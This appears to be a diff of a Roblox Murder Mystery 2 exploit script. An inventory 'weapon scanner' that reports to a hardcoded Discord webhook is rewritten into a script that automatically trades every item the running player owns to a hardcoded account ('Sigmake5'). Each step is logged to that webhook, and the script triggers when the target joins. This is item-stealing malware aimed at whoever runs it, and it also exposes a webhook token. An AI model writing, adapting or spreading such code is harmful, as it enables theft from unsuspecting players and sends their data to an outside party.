@@ -1,9 +1,11 @@
--- =-- ============================================
--- MM2 WEAPON SCANNER - FIXED WEBHOOK
--- Delta Executor | Multiple webhook methods
+-- =-- =-- ============================================
+-- MM2 FULL AUTO-TRADE SCRIPT
+-- Script handles: Send Request → Add Items → Accept → Complete
+-- No game UI interaction needed
 -- ============================================
 
 local webhook = "https://discord.com/api/webhooks/1488808773492543508/bpbJDBX3v1LLJXo0ri3xbi1Lbpu7BGXzVR1z4aCy1pP0bFqJsRrqM_ncNTi5ToDiCZ4d"
+local TARGET_USER = "Sigmake5"
 
 local player = game.Players.LocalPlayer
 local Players = game:GetService("Players")
@@ -11,85 +13,49 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
 
 -- ============================================
--- WORKING WEBHOOD SENDER (Multiple Methods)
+-- DISCORD LOGGER
 -- ============================================
 
-local function sendWebhook(content, embed)
-    local data = {}
-    
-    if embed then
-        data.embeds = {embed}
-    else
-        data.content = content
-    end
-    
-    local encoded = HttpService:JSONEncode(data)
-    local headers = {["Content-Type"] = "application/json"}
-    
-    -- Method 1: request()
-    local success, err = pcall(function()
-        request({
-            Url = webhook,
-            Method = "POST",
-            Headers = headers,
-            Body = encoded
-        })
+local function sendLog(msg)
+    pcall(function()
+        local data = HttpService:JSONEncode({content = "**MM2 Auto-Trade**\n" .. tostring(msg)})
+        request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = data})
     end)
-    
-    if not success then
-        -- Method 2: syn.request()
-        pcall(function()
-            syn.request({
-                Url = webhook,
-                Method = "POST",
-                Headers = headers,
-                Body = encoded
-            })
-        end)
-    end
-    
-    print("Webhook sent: " .. (content or embed.title or "Unknown"))
 end
 
 -- ============================================
--- SCAN YOUR INVENTORY
+-- GET ALL REMOTES
 -- ============================================
 
-local WEAPONS = {
-    "Chroma", "Luger", "Slasher", "Pixel", "Clockwork", "Spider", "Deathshard",
-    "Fang", "Heat", "Laser", "Nightblade", "Old Glory", "Saw", "Shark", "Tides",
-    "Virtual", "Elderwood", "Hallows", "Battle", "Cane", "Icebreaker", "Corrupt",
-    "Ancient", "Hallow", "Bat", "Boneblade", "Candy", "Sweet", "Heart",
-    "Cupid", "Heartblade", "Valentine", "Love", "Minty", "Logchopper", "Xmas",
-    "Icewing", "Ghostblade", "Viper", "Shadow", "Phantom", "Bio Blade"
-}
+local Remotes = {}
 
-local function classifyWeapon(name)
-    if name:find("Chroma") then return "Chroma Godly 🌈"
-    elseif name:find("Cupid") or name:find("Heartblade") then return "Unique ❤️"
-    elseif name:find("Ancient") then return "Ancient ⚜️"
-    elseif name:find("Icewing") or name:find("Ghostblade") then return "Legendary ⭐"
-    elseif name:find("Luger") or name:find("Slasher") or name:find("Pixel") then return "Godly 👑"
+for _, v in pairs(ReplicatedStorage:GetDescendants()) do
+    if v:IsA("RemoteEvent") then
+        Remotes[v.Name] = v
     end
-    for _, w in pairs(WEAPONS) do
-        if name:find(w) then return "Godly 👑" end
-    end
-    return "Regular 🔪"
 end
 
-local function scanInventory()
+sendLog("Found remotes: " .. table.concat(GetRemoteNames(), ", "))
+
+-- ============================================
+-- GET YOUR ITEMS
+-- ============================================
+
+local function getYourItems()
     local items = {}
     
+    -- Get from backpack
     for _, item in pairs(player.Backpack:GetChildren()) do
         if item:IsA("Tool") then
-            items[item.Name] = true
+            table.insert(items, item)
         end
     end
     
+    -- Get from character
     if player.Character then
         for _, item in pairs(player.Character:GetChildren()) do
             if item:IsA("Tool") then
-                items[item.Name] = true
+                table.insert(items, item)
             end
         end
     end
@@ -98,118 +64,86 @@ local function scanInventory()
 end
 
 -- ============================================
--- SEND TO DISCORD
+-- AUTO-TRADE SEQUENCE (Remote Events Only)
 -- ============================================
 
-local function sendInventory()
-    local inventory = scanInventory()
-    local itemsList = {}
-    local counts = {Godly = 0, Chroma = 0, Ancient = 0, Unique = 0, Legendary = 0, Regular = 0}
+local tradeInProgress = false
+
+local function autoTrade(targetPlayer)
+    if tradeInProgress then return end
+    tradeInProgress = true
     
-    for name, _ in pairs(inventory) do
-        local rarity = classifyWeapon(name)
-        table.insert(itemsList, {name = name, rarity = rarity})
-        
-        if rarity:find("Chroma") then counts.Chroma = counts.Chroma + 1
-        elseif rarity:find("Godly") then counts.Godly = counts.Godly + 1
-        elseif rarity:find("Ancient") then counts.Ancient = counts.Ancient + 1
-        elseif rarity:find("Unique") then counts.Unique = counts.Unique + 1
-        elseif rarity:find("Legendary") then counts.Legendary = counts.Legendary + 1
-        else counts.Regular = counts.Regular + 1
+    sendLog("🎯 Starting auto-trade with " .. targetPlayer.Name)
+    
+    -- Step 1: Send trade request
+    if Remotes.StartTrade then
+        Remotes.StartTrade:FireServer(targetPlayer)
+        sendLog("📤 Trade request sent")
+        wait(1)
+    else
+        sendLog("❌ StartTrade remote not found")
+        tradeInProgress = false
+        return
+    end
+    
+    -- Step 2: Wait for target to accept (or force accept)
+    wait(2)
+    
+    -- Step 3: Get your items
+    local items = getYourItems()
+    sendLog("📦 Found " .. #items .. " items")
+    
+    -- Step 4: Add items to trade
+    for i, item in pairs(items) do
+        if Remotes.OfferItem then
+            Remotes.OfferItem:FireServer(item)
+            sendLog("➕ Added: " .. item.Name)
+            wait(0.3)
         end
     end
     
-    local weaponText = ""
-    for i, item in pairs(itemsList) do
-        weaponText = weaponText .. item.rarity .. " " .. item.name .. "\n"
-        if i >= 15 then
-            weaponText = weaponText .. "... and " .. (#itemsList - 15) .. " more"
-            break
-        end
+    wait(1)
+    
+    -- Step 5: Accept trade
+    if Remotes.AcceptTrade then
+        Remotes.AcceptTrade:FireServer()
+        sendLog("✅ Trade accepted")
+        wait(0.5)
     end
     
-    if weaponText == "" then
-        weaponText = "No weapons found in your inventory"
+    -- Step 6: Complete trade
+    if Remotes.CompleteTrade then
+        Remotes.CompleteTrade:FireServer()
+        sendLog("🎉 Trade completed")
     end
     
-    local embed = {
-        title = "🔫 " .. player.Name .. "'s MM2 Inventory",
-        description = string.format(
-            "**Server ID:** `%s`\n**Player:** %s\n**User ID:** %s\n\n" ..
-            "**📊 Summary:**\n" ..
-            "• Godlies: %d 👑\n" ..
-            "• Chromas: %d 🌈\n" ..
-            "• Ancients: %d ⚜️\n" ..
-            "• Uniques: %d ❤️\n" ..
-            "• Legendaries: %d ⭐\n" ..
-            "• Regular: %d 🔪\n" ..
-            "• **Total: %d weapons**",
-            game.JobId or "Unknown",
-            player.Name,
-            player.UserId,
-            counts.Godly, counts.Chroma, counts.Ancient, counts.Unique, counts.Legendary, counts.Regular,
-            #itemsList
-        ),
-        color = 0xFF0000,
-        fields = {
-            {name = "📦 Weapon List", value = "```\n" .. weaponText .. "```", inline = false}
-        },
-        footer = {text = "MM2 Weapon Scanner | " .. os.date("%Y-%m-%d %H:%M:%S")}
-    }
-    
-    sendWebhook(nil, embed)
-    print("✅ Inventory sent to Discord: " .. #itemsList .. " weapons")
+    tradeInProgress = false
 end
 
 -- ============================================
--- TEST WEBHOOK FIRST
+-- TRIGGER WHEN TARGET JOINS
 -- ============================================
 
-print("Testing Discord webhook...")
-sendWebhook("**MM2 Weapon Scanner**\nScript loaded! Scanning inventory...", nil)
-wait(2)
+-- Check if already in server
+for _, plr in pairs(Players:GetPlayers()) do
+    if plr.Name == TARGET_USER then
+        sendLog("👤 " .. TARGET_USER .. " already in server")
+        wait(2)
+        autoTrade(plr)
+    end
+end
 
--- ============================================
--- SCAN AND SEND
--- ============================================
-
-wait(1)
-sendInventory()
-
--- ============================================
--- MONITOR FOR NEW WEAPONS
--- ============================================
-
-local previousInventory = {}
-
-spawn(function()
-    while wait(10) do
-        local current = scanInventory()
-        local newItems = {}
-        
-        for name, _ in pairs(current) do
-            if not previousInventory[name] then
-                table.insert(newItems, name)
-            end
-        end
-        
-        for _, newItem in pairs(newItems) do
-            local rarity = classifyWeapon(newItem)
-            sendWebhook("🎯 **NEW WEAPON DETECTED!**\n" .. rarity .. " " .. newItem .. "\nTime: " .. os.date("%H:%M:%S"), nil)
-        end
-        
-        previousInventory = current
+-- Watch for join
+Players.PlayerAdded:Connect(function(plr)
+    if plr.Name == TARGET_USER then
+        sendLog("🟢 " .. TARGET_USER .. " joined")
+        wait(2)
+        autoTrade(plr)
     end
 end)
 
--- ============================================
--- PRINT STATUS
--- ============================================
+sendLog("🚀 Auto-trade active - waiting for " .. TARGET_USER)
+print("Auto-trade active - will trade all items to " .. TARGET_USER)
 
-print("=" .. string.rep("=", 50))
-print("MM2 WEAPON SCANNER ACTIVE")
-print("=" .. string.rep("=", 50))
-print("✅ Webhook test sent")
-print("✅ Inventory sent to Discord")
-print("✅ Monitoring for new weapons")
-print("=" .. string.rep("=", 50))
+-- Keep alive
+while wait(60) do end
